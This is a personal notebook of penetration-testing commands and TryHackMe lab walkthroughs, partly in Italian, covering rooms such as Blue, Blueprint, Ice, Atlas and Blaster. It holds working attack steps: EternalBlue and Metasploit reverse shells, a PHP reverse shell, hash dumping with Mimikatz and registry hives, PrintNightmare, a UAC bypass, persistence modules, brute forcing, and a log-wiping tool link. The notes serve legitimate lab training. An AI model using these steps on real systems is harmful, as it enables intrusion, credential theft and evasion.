---
created: 2024-02-09T10:59
updated: 2024-12-27T11:33
---


Creators for CTF: [HackTheBox Certified Penetration Testing Specialist (CPTS) - Review + Tips (youtube.com)](https://www.youtube.com/@_CryptoCat/videos)

*Cover your tracks during Linux Exploitation by leaving zero traces on system logs and filesystem timestamps*
https://github.com/mufeedvh/moonwalk

# Nmap

Basic nmap scan:

nmap -vv -sC -sV -oN nmap.log $IP

Complete nmap scan:

nmap -vv -A -p- -oN nmap-complete.log $IP


# Privescs Discovery

Find privescs exploiting SUID binaries:

>find / -perm -u=s -type f 2>/dev/null

Find privescs by listing sudo permissions:

>sudo -l

Enumerate interesting files, processes, and privescs using Linpeas:

- Install [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) on your machine.
- Transfer it to the target machine. (see the [Transferring Files](https://blog.noxtal.com/cheatsheets/2020/07/30/essential-commands/#Transferring-files))
- Make it executable, run it, and `tee` the output to a log file for further analysis.

>chmod +x linpeas.sh  
./linpeas.sh | tee linpeas.log

# Transferring Files

Open an HTTP server:

- `cd` into the directory you want to access one or more files from.
- Open an HTTP server:

# PYTHON3  

> python3 -m http.server -b $IP $PORT

# PHP  

>php -S $IP:$PORT

- Access the file:

# Wget  

>wget http://$IP:$PORT/file

# Curl  

>curl [http://$IP:$PORT/file](http://$ip:$PORT/file) -o target_file

# Netcat  

>nc $IP $PORT > target_file

Using SCP:

# Send  

>scp /path/to/file user@$HOST:/path/

# Send with custom name  

> scp /path/to/file user@$HOST:/path/different_name

# Get  

>scp user@$HOST:/path/to/file /local/directory

_Note: To connect with an SSH key, you may need to use the_ `_-i_` _flag followed by the path to the key._

Using netcat:

# Server  

>nc -lp $PORT < file

# Client  

> nc $IP $PORT > file

# Web Directory and Query Parameters Bruteforce

Using gobuster:

> gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster.log -t 200 -u $URL

Tip: directory scan using Gobuster:

>gobuster dir -u http://<*targetIP*> --wordlist=/usr/share/wordlists/dirb/big.txt

Using wfuzz:

>wfuzz -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 --hc 404 http://www.host.name/FUZZ

Using wfuzz to bruteforce query parameters:

>wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 --hc 404 http://www.host.name/?parameter=FUZZ

Recursive directory scan with wfuzz:

>wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 200 --hc 404 -R $DEPTH http://www.host.name/FUZZ

# Web

# HTTP Form Bruteforce

Using Hydra:

Hydra is a powerful password-cracking tool that can perform rapid dictionary attacks against more than 50 protocols, including SSH, FTP, HTTP, HTTPS, SMB, pop3, IMAP, and many more. It’s included in Kali Linux by default.

>hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<*Login Page>:<*Request Body*>:<Error Message*>"

Using wfuzz:

>hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<*Login Page*>:<*Request Body*>:<*Error Message*>"

#source: [Hydra Cheat sheet. Hydra is a powerful password-cracking… | by Ravuladeepak | Medium](https://medium.com/@ravuladeepak2202/hydra-cheat-sheet-737d2f1aeb5a)

![](https://miro.medium.com/v2/resize:fit:805/1*Pwsg1j5GQ8JhLmVHRZy48A.png)

Here’s an example of how to use Hydra to brute force an SSH server:

```
hydra -L users.txt -P passwords.txt 10.0.0.1 ssh
```

Hydra supports a wide range of options and parameters to customize its behavior. Here are some examples:

- Use a specific port: `hydra -s 2222 10.0.0.1 ssh`
- Attack multiple hosts: `hydra -M hosts.txt -P passwords.txt ssh` (where `hosts.txt` is a file containing a list of hosts)
- Use a custom wordlist for usernames: `hydra -L usernames.txt -P passwords.txt 10.0.0.1 ssh`
- Limit the number of connections: `hydra -t 4 10.0.0.1 ssh` (limits the number of connections to 4)
- Use a specific protocol module: `hydra http-get://10.0.0.1 login:password`

![](https://miro.medium.com/v2/resize:fit:778/1*vUR9uevjXjl_W2GQfOYFDA.png)

# Wordpress

WPScan + password bruteforce:

>wpscan --url $URL --passwords /usr/share/wordlists/rockyou.txt --usernames usernames.txt

# Subdomain Bruteforce

Using wfuzz:

> wfuzz -c -f wfuzz-sub.log -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u $URL -H "Host: FUZZ.host.name" -t 32 --hc 200 --hw 356

_Note: you will need to adjust the_ `_--hc_` _and_ `_--hw_` _parameters to your needs. Check_ `_wfuzz -h_` _for more information about those._

Using gobuster:

>gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $URL -t 32

# Cracking

# ZIP

> fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip

# Hashes

Using hashcat:

> hashcat -m $MODE hashes /usr/share/wordlists/rockyou.txt

# Bruteforce SSH

Using hydra:

> hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh

# Steganography

Crack steghide passphrase using stegracker: Install:

> pip3 install stegcracker

Run:

>python3 -m stegcracker tocrack.jpg

09/02/2024

# 1°
# Walkthroght THM Blue


normal scan:

> nmap -sS -Pn -A -p- -T5 $ip


However in the normal CTF we used this, to find a vulnerability cve: 

> nmap -sS -sV  -sC -A --script vuln <*ip*>

find CVE: ms17-010

> msfconsole

> search ms17-010

> use 0  ....eternalblue exploit

set payload, even if is as default (but as a meterpreter, not shell)

> set payload  windows/x64/shell/reverse_tcp

> set RHOSTS <ip*>

> run

> background


how to upgrade sheels in metasploit:

> search shell_to

use 0 (shell to meterpreter)

> set SESSION 1 

you do this to upgrade the shell that you already have!

example of what happens if you do set SESSION 2 instead of 1
 ![[Pasted image 20240209125133.png]]

> show options (we see it miss our ip)

> set LHOST <our ip*>


> run

> sessions -l

> sessions -i 1

>  verify we have the authority system:


> getsystem  (on meterpreter)

> shell

>whoami (output: NT Authority sys.)

> exit (and return to meterpreter)

> ps (see process running in authority)

> migrate 3078 (if says "access denied" when running the command then, you're still good to go.)

> hashdump (on meterpreter)

 create file hash.txt and put the John hash and save the file, create it: 
 (on another terminal)

> vim hash.txt -> put hashes founded.

crack:

> john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt


Return on meterpreter:
# Task 5: Find flags!

## Flag1? _This flag can be found at the system root._

![](https://miro.medium.com/v2/resize:fit:530/1*deB5JrdNvbmSuTyssTw95w.png)

> Answer: flag{access_the_machine}

## Flag2? _his flag can be found at the location where passwords are stored within Windows._

search -f flag2.txt

![](https://miro.medium.com/v2/resize:fit:875/1*4M646IrNaZMweqs_cY1kpQ.png)

![](https://miro.medium.com/v2/resize:fit:689/1*OMZ4retjt5SJA8Pf66TYMw.png)

> Answer: flag{sam_database_elevated_access}

## flag3? _This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved._

![](https://miro.medium.com/v2/resize:fit:875/1*l9LOYKZbYw7MqH8H6-yQsQ.png)

> Answer: flag{admin_documents_can_be_valuable}


-----------------

10/02/2024

# 2°

# THM Walkthrougth Blueprint:

Enumeration:

sudo nmap -sS -sV -sC -vv -T4 -Pn [targetMachineIP]

The results of the scan shows 13 open ports

![](https://miro.medium.com/v2/resize:fit:469/1*DJIRCLIkM9V0oWd4DkusTA.png)

You can enter and visit websites by going to the browser and typing  -> 
http://[targetIP]:portnumber -- legenda

in practice way:

http://[targetMachineIP]:80  

![[Pasted image 20240210183826.png]]



|Port|Investigation Result|
|---|---|
|80|Return a 404-page error|
|8080|**A legit oscommerce 2.3.4 webpage**|
|443|**A legit oscommerce 2.3.4 webpage with SSL**|
|139,445|Require a credential and exploit failed with eternal blue|
|135|exploit failed with msf_rpc_console|
|3306|Can’t remote access. Refer to this [link](https://mariadb.com/kb/en/library/connecting-to-mariadb/).|

![[24506adx.bmp]]

port 80 (http) is open so try to do directory enumeration with gobuster:

![[44ij6xjh.bmp]]

gobuster dir -u [http://[targetMachineIp]] - w /usr/share/wordlists/dirb/big.txt

 > Accessing port 443 through Firefox browser we can see there is a file named “oscommerce-2.3.4
 
access by link, and you could see something like "oscommerce 2.3.4" try to search an exploit for that service:

![[8vu4iz7y.bmp]]
> searchsploit  oscommerce-2.3.4

> searchsploit -m 44374.py (RCE)

BY the way, you can:
open this script with vim and read through so we can understand how it works.

> vim 44374.py (to find some info about the administrator page)


![[ks12gbac.bmp]]

Further down we can see a payload.

![[qjxpex7r.bmp]]

hese seems like a Linux POC payload but we know from the enumeration (and the description of this challenge )  or you could see via enumeration "-A"that our target machine works with windows. After some search for php payloads I found that this payload will work like a charm from [here](https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php). We just need to change the $ip parameter to our IP so we can get a reverse shell at port 1234.

Resource:

![[Pasted image 20240210172139.png]]

you just modify the ip to your's and the port where your netcat is listening on:

> nc -nlvp 1234

or you can use metasploit:

reverse shell with metasploit:

#### 3) Metasploit

```
msf5> use exploit/multi/handler
msf5> set payload windows/shell/reverse_tcp
msf5> set lhost tun0
msf5> set lport 1234
msf5> run
CTRL+Z to background shell
sessions -u 1
sessions -i 2
use post/multi/manage/shell_to_meterpreter
set session 1
run
sessions
sessions -i 2
```

```
meterpreter> run hashdump
```

crack NTLM:

![hash](https://deskel.github.io/assets/images/THM/2020-08-14-blueprint/9.png)

grab the NTLM hash for the “Lab” user and crack it with a tool such as [CrackStation](https://crackstation.net/).

The NTML hash password for user Lab is

```
30e87bf999828446a1c1209ddde4c450
```

```
C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes> whoami
```

![window shell](https://deskel.github.io/assets/images/THM/2020-08-14-blueprint/10.png)

We already have the admin privilege and that makes things easy. So, locate the administrator folder and capture the root flag.

However if you keep up with netcat:


In the end the payload look like this

![[4eicrp2c.bmp]]

curl the URL: curl + <*url*>

![[8c6pfd9n.bmp]]

now slowly try to find the root flag by navigating in the directory:

dir C:\\ -> dir C:\\Users\\Administrator -> dir C:\\Users\\Administrator\\Desktop

and you should see the root flag: 

 dir C:\\Users\\Administrator\\Desktop\\root.txt.txt

For the first question we need to do more work. We need to extract the hashes from the target machine. If you try to search how to dump hashes from windows machine you will see methods using Mimikatz, Metasploit and many more sophisticated tools but in reality there is a more convenient, easy and less intrusive method.

To be able to dump the hashes we need 3 hives SAM, SECURITY and SYSTEM

We can get a copy from these hives with the following commands.We can save these copies to _C:\\xampp\\htdocs\\oscommerce-2.3.4\\_

>reg.exe save hklm\sam _C:\\xampp\\htdocs\\oscommerce-2.3.4_\\sam.save

>reg.exe save hklm\security_C:\\xampp\\htdocs\\oscommerce-2.3.4_\\security.save

>reg.exe save hklm\\system _C:\\xampp\\htdocs\\oscommerce-2.3.4_\\system.save

![[isq2i8ib.bmp]]

Because we have access to this directory from our browser on our kali machine we can simply click on them and download these files so we do not need complex methodologies to transfer the files.

![[j9qm6nlg.bmp]]

python3 secretsdump.py -sam /home/kali/Downloads/sam.save -security /home/kali/Downloads/security.save -system /home/kali/Downloads/system.save LOCAL

![](https://miro.medium.com/v2/resize:fit:875/1*3XPWNSMGjCo4iYjdZsgOtw.png)

! if this dosen't work, try the first method with metasploit.

Now we can grab the NTLM hash for the “Lab” user and crack it with a tool such as [CrackStation](https://crackstation.net/)

--------------------

12/02/2024

# 3°
# THM Anthem

> nmap -sS -sV -sC --script vuln <*ip*>

http porta aperta 80 e RDP aperta 3389 Microsoft Remote Desktop (MSRDP).

> vai sul browser -> http://iptarget:80

Trovare le flag:

Ispezionando il codice sorgente  del sito e cercando leggermente sul sito stesso possiamo trovare tutte e 4 le flag:

![[Pasted image 20240212171745.png]]
![[Pasted image 20240212172525.png]]
![[Pasted image 20240212172557.png]]
![[Pasted image 20240212172615.png]]


Puoi trovare il nome dell'admin cercando sull'internet chi ha creato questo poema:

![[Pasted image 20240212171853.png]]

Solomon Grundy:

![[Pasted image 20240212171911.png]]


In base al CV (Curriculum Vitae) possiamo dedurre che dobbiamo prendere le iniziali del nome dell'admin (Solomon Grundy -> SG) per poter entrare nel login page.

![[Pasted image 20240212171258.png]]

La quale ci fa intuire che la Email sia:
SG@Anthem.com

Sul sito prova anche a vedere per informazioni private sui file di default come : "robots.txt"

![[Pasted image 20240212170057.png]]

Li troviamo una potenziale password: "UmbracoIsTheBest!" e il nome del CMS (Content Management System) "umbraco"
![[Pasted image 20240212184843.png]]

andando sul browser e cerchiamo:

-> <*targetip*>/umbraco 

troviamo il login page 

dove le credenziali sono quelle che abbiamo trovato prima:

-> email + password 
![[Pasted image 20240212185627.png]]


(in questo caso, ci è solo utile entrare ma nulla di più o di meno.)


Dato che la porta 3389 è aperta (RDP) utiliziamo remmina per fare il log in:

![[Pasted image 20240212172718.png]]
![[Pasted image 20240212172754.png]]
Da qui mettiamo l'username "SG" e la password "Umbracoisthebest!" e dato che non abbiamo nessun dominio mettiamo vuoto:

 > entra
 
 da li apriamo il txt file dove troviamo un'altra flag.

vai su explora file -> questo PC -> "view" -> e abilità la visibilità ai file nascosti:

![[Pasted image 20240212185831.png]]

-> "Hidden files" with the "check"

-> vai sul local disk -> backup -> restore
non avrai i permessi per aprirlo ma per bypassare questo facciamo  cosi:

-> tasto dx sul file -> proprietà -> "security" 
![[Pasted image 20240212174442.png]]

-> EDIT -> "add" -> scrivi: "SG" ovverò l'utente

![[Pasted image 20240212174514.png]]
-> "ok" e poi riapri il file, da li troveremo la password dell'utente  root per poter escalare i nostri privilegi: "ChangeMeBaby1MoreTime"

Ora in base a questa missione:

![[Pasted image 20240212180019.png]]

vai sul disco locale C:\\ -> Users -> Administrator -> immetti la password che abbiamo trovato prima.

![[Pasted image 20240212180136.png]]

Ora dovresti poter entrare nella cartella administrator e cercare l'ultima flag

-> entra nella cartella

![[Pasted image 20240212180415.png]]

-> cerca, ma eventualmente la root flag la troverai nel desktop -> root.txt

![[Pasted image 20240212180509.png]]

---------------------

13/02/2024

# 4°
# THM - Ice

-> nmap -sS -sV --script vuln 'ip'

![[nyixt2z7.bmp]]
service name on port 8000: Icecast

![[8hi0nccc.bmp]]
 

You could see that our machine is vulnerable to the server **Icecast streaming media server** which is running in the port **8000.** So go ahead and Research further to find about the exploit.

pay attention that MSRDP is open "3389":

> What does Nmap identify as the hostname of the machine?

![[42fmv5gv.bmp]]


> What type of vulnerability is Icecast?


[**_https://www.cvedetails.com/cve/CVE-2004-1561/_**](https://www.cvedetails.com/cve/CVE-2004-1561/)

![[nxwxzcqh.bmp]]


-> msfconsole -> search icecast -> use 0

-> exploit/windows/http/icecast_header -> options

-> set rhost 'your ip' -> run -> "background the shell" 

> What user was running that Icecast process?

![[cej4v2pg.bmp]]

Gather info about the system on a shell -> systeminfo (this one works)

What build of Windows is the system?

![[1npdi5n2.bmp]]

so is: 7601

> Now that we know the architecture of the process, let's perform some further recon.

-> **search post/multi/recon/local_exploit_suggester**

-> set session 1

-> set ShowDetailsInClear True -> run

![[tatvzwq8.bmp]]

> What is the full path (starting with exploit/) for the first returned exploit?

**ANS:** exploit/windows/local/bypassuac_eventvwr

Now that we have an exploit in mind for elevating our privileges


![[3cqxiwzb.bmp]]

-> **use exploit/windows/local/bypassuac_eventvwr**

-> set session 1 -> options -> "setup the rhosts and lhost if required"

To change the Ip from etho to tun0 go and set the lhost to **tun0** and run the exploit again

-> set LHOST tun0 (do this if required)

-> run

> What permission listed allows us to take ownership of files?

-> getprivs

![[eilgogpc.bmp]]

**ANS:** SeTakeOwnershipPrivilege

-> ps -> migrate 'PID'

![[b5jbaxv3.bmp]]

-> getsystem

Now that we’ve made our way to full administrator permissions we’ll set our sights on looting.

![[92f0i6c8.bmp]]

-> help

![[0p229wga.bmp]]

-> creds_all

![[y7za2iav.bmp]]

> And with that, we now can Perform MSRDP on remmina:

-> remmina -> "write the username, password and domain."

>You could also use hashdump and crack the hashes. Let me show you how.

![[8emygjcq.bmp]]

![[qg39nkni.bmp]]



----------------------

15/02/2024

# 5°
# THM Atlas

 We will do a  Windows Server Exploitation Methodology and Guide:

![[Pasted image 20240215173512.png]]


└─$ sudo nmap -sT -A -v -Pn -p- -O -sC -oX tcp_scan.1.xml atlas.thm**

The room notes that the target machine is running Windows, so the `-Pn` flag will need to be used to ignore the fact that Windows does not respond to ICMP requests and proceed to launch a port scan regardless. The `-oX tcp_scan.1.xml` flag instructs nmap to store its results in a XML format.

I have taken the liberty of converting the raw XML output into a readable HTML format with the `xsltproc` utility:


> xsltproc tcp_scan.1.xml -o tcp_scan.html

output in XML file:

![None](https://miro.medium.com/v2/resize:fit:700/1*1TOq6CmfAIJQ9X2b6BvKKw.png)

output in nmap scan:

![[Pasted image 20240215210002.png]]


We have 2 open ports: MSRDP port open and 8000 open and it's service is http proxy so we can try viewing it's page on the browser,  try seeing on the browser for port 8000:



We have to log in for this:

![[Pasted image 20240215175907.png]]

We get an request for authentication; this could have gone better, but it _does_ tell us one very important thing: we are _definitely_  dealing with a web server of some kind.

Whilst newer versions of Firefox don't seem to show it, these HTTP Basic Authentication credential boxes usually come with a message from the server -- if we can get a look at that message then we might get a clue as to what is running on this port!

> curl http://<*IP*>:8000



Output of the response from the server:

![[Pasted image 20240215180736.png]]

We have a variety of sections in this request -- all have been highlighted.

- In yellow we have the _request_ headers -- these are what we _sent_ to the server. We aren't interested in these just now.
- In green we have the _response_ headers -- these are what the server sent to _us_ in response. This contains something interesting.
- In cyan we have the response _body_ telling us that we aren't allowed to access the site unless we supply some credentials.

In red we have what we were looking for. "ThinVNC" is the name of a web-based **V**irtual **N**etwork **C**omputing (VNC) server. Like RDP, VNC allows us to access a device remotely; however, this server allows us to access to device from our web browser rather than requiring a separate client to connect

-> search for the exploit:

![[Pasted image 20240215181250.png]]

At this point we would usually copy the exploit, read through it carefully (very important!) then deploy it against the target when we are satisfied that it only does what it claims to do.

In this case the exploit in Exploit-DB doesn't actually work, but it does give us an idea of what we're dealing with. The short version is:

The latest version of ThinVNC (at the time of writing is **November 16, 2020**.) contains a path traversal vulnerability which effectively allows us to read any file on the target. Combine this with the fact that ThinVNC (stupidly) stores its access credentials in plaintext (i.e. completely unsecured), we can read the file containing the credentials and bypass the authentication!

This is the error given if trying to run:

![[Pasted image 20240215182817.png]]


For the sake of keeping things very simple, we are going to use a working copy of the exploit to access the credentials.

So:

> git clone [https://github.com/MuirlandOracle/CVE-2019-17662](https://github.com/MuirlandOracle/CVE-2019-17662)

![[Pasted image 20240215181959.png]]

run: 
> ./CVE-2019-17662.py 10.10.67.121 8080


![[Pasted image 20240215183040.png]]

**Bonus: reading the code of the exploit**

In the highlighted part, we have the credential that get retrived from the configuration file 
(line 110) that is "==..ThinVnc.ini==", and THAT file according to this version, is vulnerable to read access by anyone

![[Pasted image 20240215204917.png]]


--------

Use the credentials found by the script to get past the HTTP Basic Auth presented when trying to access the vulnerable service in your web browser. You should have access to a user desktop!

-> Fai il log in sul sito:

**Bonus:** Read through the exploit code and try to perform the exploit manually using cURL or Burp Suite. You may need to look into _path normalisation_ for error debugging.

-> you will be redirected here, connect to the machine by putting the Target ip:

![[Pasted image 20240215204312.png]]

![[Pasted image 20240215205640.png]]

As the interface of VNC is not comfortable so we're gonna switch to RDP (VNC -> RDP)

![[Pasted image 20240215210822.png]]

The syntax for using `xfreerdp` looks like this:  
`xfreerdp /v:MACHINE_IP /u:USERNAME /p:PASSWORD /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp`  

There's a bunch of stuff going on here, so let's break each switch down:

- `/v:MACHINE_IP` -- this is where we specify what we want to connect to.
- `/u:USERNAME /p:PASSWORD` -- here we would substitute in a valid username/password combination.
- `/cert:ignore` -- RDP connections are encrypted. If our attacking machine doesn't recognise the certificate presented by the machine we are connecting to it will warn us and ask if we wish to proceed; this switch simply ignores that warning automatically.
- `+clipboard` -- this shares our clipboard with the target, allowing us to copy and paste between our attacking machine and the target machine.
- `/dynamic-resolution` lets us resize the GUI window, adjusting the resolution of our remote session automatically.
Dynamic resolution is **a Camera setting that allows you to dynamically scale individual render targets, to reduce workload on the GPU**. 
- `/drive:share,/tmp` -- our final switch, this shares our own `/tmp` directory with the target. This is an _extremely_ useful trick as it allows us to execute scripts and programs from our own machine without actually transferring them to the target (we will see this in action later!)


> run -> wait for RDP session


At this point we would usually start to enumerate the target to look for privilege escalation opportunities (or potentially lateral movement opportunities in an Active Directory environment). [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and [Seatbelt](https://github.com/GhostPack/Seatbelt) are prime examples of tools that we may wish to employ here; however, there are many other tools available, and manual enumeration is always a wise idea.


To keep this room simple, we will instead look at a set of exploits in the PrintSpooler service which are unpatched at the time of writing. PrintSpooler is notorious for privilege escalation vulnerabilities. It runs with the maximum available permissions (under the `NT AUTHORITY\SYSTEM` account) and is a popular target for vulnerability research. There have been many vulnerabilities found in this service in the past; however, one of the latest is referred to as "PrintNightmare".  

We will use PrintNightmare to elevate our privileges on this target.

> On Linux terminal:

> cd /tmp -> git clone https://github.com/calebstewart/CVE-2021-1675

![[Pasted image 20240215212514.png]]

### now we want to sharing the exploit to the target machine:

![[Pasted image 20240215212950.png]]

Now to share the exploit into powershell we have to see the path of the exploit, so to see that go to: -> files -> share on kali -> CVE-2021-1675 and see the path:

where we see the domain "tsclient"

![[Pasted image 20240215214338.png]]

now we import the exploit via powershell:

![[Pasted image 20240215214513.png]]


> Invoke-Nightmare

![[Pasted image 20240215214617.png]]

Now we have the password and user name of the new Administrator user:

We could take the simple option of right-clicking on PowerShell or cmd.exe and choosing to "Run as Administrator", but that's no fun. Instead, let's use a hacky little PowerShell command to start a new high-integrity command prompt running as our new administrator.

The command is as follows:  
`Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n`

-> log in

It should spawn  a cmd with Elevated Privileges:

![[Pasted image 20240215215345.png]]

see if you have privilege's: -> whoami /groups 
You should see `BUILTIN\Administrators` in the list of groups, and a line at the bottom of the output containing `Mandatory Label\High Mandatory Level`.

![[Pasted image 20240215220754.png]]

This means you're running as Administrator.

The classic thing to do here would be to try to dump the password hashes from the machine. In a network scenario these could come in handy for lateral movement. They also give us a way to prove our access to a client as Windows ([Serious Sam](https://www.rapid7.com/blog/post/2021/07/21/microsoft-sam-file-readability-cve-2021-36934-what-you-need-to-know/) vulnerability aside) prevents anyone from accessing this information if they don't have the highest possible privileges.

We will dump passwd with [Mimikatz](https://github.com/gentilkiwi/mimikatz) 

First up, let's get an up-to-date copy of Mimikatz to our attacking machine. The code for the tool is publicly available on Github, but fortunately for the sake of simplicity, there are also pre-compiled versions available for download.

Go to the [releases page](https://github.com/gentilkiwi/mimikatz/releases) for Mimikatz and find the latest release at the top of the list. Download the file called `mimikatz_trunk.zip` to your attacking machine.

-> move to terminal -> cd Desktop -> ls -la "search for mimikatz zip file"

> mv mimikatz_trunk.zip /tmp

![[Pasted image 20240215222011.png]]

You should try to find the path in wich where is "mimikatz.exe":

> cd /tmp

> unzip mimikatz_trunk.zip 


![[Pasted image 20240215222325.png]]

Now we can get to work!

Switch back into your RDP session and (using the elevated Command Shell we obtained in the last task) execute the following command to start Mimikatz:  
`\\tsclient\share\x64\mimikatz.exe`

When we start Mimikatz we usually have to execute two commands before we start dumping hashes:

-  `privilege::debug` -- this obtains debug privileges which (without going into too much depth in the Windows privilege structure) allows us to access other processes for "debugging" purposes.
- `token::elevate` -- simply put, this takes us from our administrative shell with high privileges into a `SYSTEM` level shell with maximum privileges. This is something that we have a _right_ to do as an administrator, but that is not usually possible using normal Windows operations.

> lsadump::sam

![[Pasted image 20240215223132.png]]

---------------------------

18/02/2024

# THM Blaster

# 6°

![[jr4m4bme.bmp]]

![[3fvj9x6b.bmp]]

Seems like **IIS**(Internet Information Services) **Windows Server** running in port 80. Now let us do directory fuzzing using dirbuster.

hidden directory: "retro"

![[yan40449.bmp]]

Now by analyzing the text we could see:

![[xawkmq6m.bmp]]

Looks like we got the username **Wade** and some information about the password credentials. He mentions that is password is based on the Ready Player One’s
![[68ihsoom.bmp]]

What potential username do we discover?

**ANS:** Wade

What possible password do we discover?

**ANS:** parzival


**xfreerdp /u:wade /p:parzival /v:10.10.99.16**

![[g4mgxql5.bmp]]

![[c7wp9nyc.bmp]]

https://tryhackme.com/room/blaster

## Task 3: **Breaching the Control Room**

When enumerating a machine, it’s often useful to look at what the user was last doing. Look around the machine and see if you can find the CVE which was researched on this server. What CVE was it?

_Discaimer in this case the browse data isn't here anymore, so you actually need a guide to complete it:_

![[wfg21k9a.bmp]]

**ANS:** CVE-2019–1388

Looks like an executable file is necessary for exploitation of this vulnerability and the user didn’t really clean up very well after testing it. What is the name of this executable?

![[q4e4jtj1.bmp]]

QUESTION: Research vulnerability and how to exploit it. Exploit it now to gain an elevated terminal!

> Run the hhupd as administrator

![[e4h1s6yo.bmp]]

![[ynbmga9k.bmp]]

Click on the **VeriSign Commercial Software Publishers CA.**

![[3xtnz124.bmp]]


Open it in explorer and the go to settings →File →Save as.

![[22agqbzi.bmp]]

Click on OK and continue.

![[263gbkg6.bmp]]

In filename enter the filename as

**C:\\Winndows\\System32** -> press enter

![[3btks5du.bmp]]


In the folder area search for **cmd.exe** and press enter.

![[t03nl68j.bmp]]

![[7r88pmv7.bmp]]

Go to the C: derive and navigate to

**C:\\Users\\Administrator\\Desktop** to find the root flag.

![[t856l3tj.bmp]]

use: **type root.txt** or **more root.txt**

## Task 4 Adoption into the Collective

Now that we’ve thoroughly compromised our target machine, let’s return to our exploitation tools so that we can gain remote shell access and persistence.

![[9a62j5li.bmp]]

> set lport 443 (**standard port for HTTPS**) or use: set tun0

> set lhost <*yourIP*> 

set the target to PSH (Powershell):

> show targets -> set target 2

Now set the payload:

![[uvtva114.bmp]]

**run -j**

![[6uv3u4dx.bmp]]

Now copy and paste the metasploit’s output in the windows shell


![[5dvymhdr.bmp]]

![[q54d2clo.bmp]]



Bonus: to gain persistence do:

> run persistence -X 

or try other:

> use windows/local/persistence

> use exploit/windows/local/s4u_persistence.

reference: [**_https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/_**](https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/)

![[889gl8vr.bmp]]


---

19/02/2024

# THM Hjacking

# 7°

https://tryhackme.com/room/hijack?path=undefined

24/02/2024

[ da fare su openvpn]

-> rustscan -a <*IP*>

![[3of9m8q2.bmp]]



ora potresti andare a cercare su internet "ftp exploitation" e trovi questo:
![[Pasted image 20240222231215.png]]

There are three services are really interesting for the initial lookup. I first checked the ftp and I thought maybe it allows the anonymous login but it failed. Then look into the nfs. Use `showmount -e` to show any exist directory names.

![[0lac9hs2.bmp]]

After that, I create a local directory and mount the share folder to local.

![[va98o58f.bmp]]
![[mjiqzm36.bmp]]

**the problem here is, if you first do this room and try to access the share folder. The error will happen and says you do not have the access right. because is read only by only the user  in the group "1003" (UID 1003), and no one else could read it.**


risorsa presa da: https://www.washington.edu/doit/technology-tips-chmod-overview
### Finding the current permissions

Typing **ls -ld** at the host system prompt will show you the permissions of your home directory, with a string of 10 characters that should look something like **drwx------ or drwx--x--x**. The first character is what type of entry you're looking at, either **d** for directory or **-** for a plain file. The rest of the characters are broken up into fields of three. The first set of three represent the owners permissions, the second set of three represent the group permissions (the use of group permissions varies from system to system. They are not generally used on UW Uniform Access systems), and the third set of three representing the "other" permissions. The "other" category encompasses everyone else and is usually called world, which I will use for the rest of this article. The first character of each set represents read (**r**) which allows read access to the file. The second character of each set represents write (**w**) which allows changes to be made to the file, including deletion. The third character of each set represents execute (**x**) which allows running the file. A dash (**-**) in any entry means no permission for that operation. So, the first example of the ls -ld command (**drwx---------**) <mark style="background: #FF5582A6;"> means the entry is a directory in which the owner has read, write and execute permissions and no one else has any permissions.</mark>

Since we do not have permission to access the share file, let’s try to see if we can bypass it by defining a user in the 1003 group.

> useradd -u 1003 -m -d /home/fakeuser fakeuser

![[2w6aim8h.bmp]]

![[ma9esnwj.bmp]]

Trick= To make the shell screen more readable, we just need to enter the following command

python3 -c ‘import pty;pty.spawn(“/bin/bash”)’

![[3ye9oci3.bmp]]

---
# another method to bypass the user group is to:  Clone NFS

![[Pasted image 20240224185054.png]]
				 resource by HackTricks

> git clone https://github.com/NetDirect/nfsshell 

![[Pasted image 20240224185518.png]]

now use the help command or see this resource: https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/

> host <*targetIP*>  (after we setup the host, we need to specify the user id and the group id)
> ->  uid 1003 -> gid 1003 -> export -> mount /mnt/share

> ls (output: employes.txt) -> get for_<*filename*> (so is: get for_employes.txt)

> open new terminal -> cat employes.txt

---

We have obtained the username and password, we are trying an FTP connection with this information.

![[tyiaua6x.bmp]]

We save the files here to the folder on our attacker machine with the “get” command.

![[rj5j7hjy.bmp]]

![[4zfm2ds2.bmp]]

In the text here, we have access to the possible passwords used by the “admin” user to log in to the website. Now we need to try to catch the requests with Burpsuite and see if we can log in, but we read a note here that the logins are limited and this will be good against brute force attacks.

![[g4fq62es.bmp]]

We found that the login screen hangs for 300 seconds after 5 unsuccessful password attempts, so we need to try a different method. For this, we should not define a different user to the site, capture his login request in Burpsuite and ask whether we can manipulate it.

I created a user with the name “fakeuser” and the password “password123”.



see video: https://www.youtube.com/watch?v=9MLteNajIaU (da 15:00 in poi)

and the 2 writeups:

https://ahmetakyazili.medium.com/hijack-tryhackme-7a2e2da1269d

https://medium.com/@OwenW_CTF/hijack-tryhackme-detailed-explanation-65e9d2b1a717

(da rivedere)

-----

04/3/2024
# THM Weasel

# 8°

https://tryhackme.com/room/weasel?source=post_page-----4b40c30c1250--------------------------------

-> rustscan -a $ip

![[Pasted image 20240304173654.png]]
with nmap:
![[weeblhx7.bmp]]

There is a 22/ssh open which will probably be how we connect possibly at the end before a final privilege escalation; There is samba, which we will take a look at immediately; and there is a http jupyter notebook on port 8888

let’s first check out samba.

---
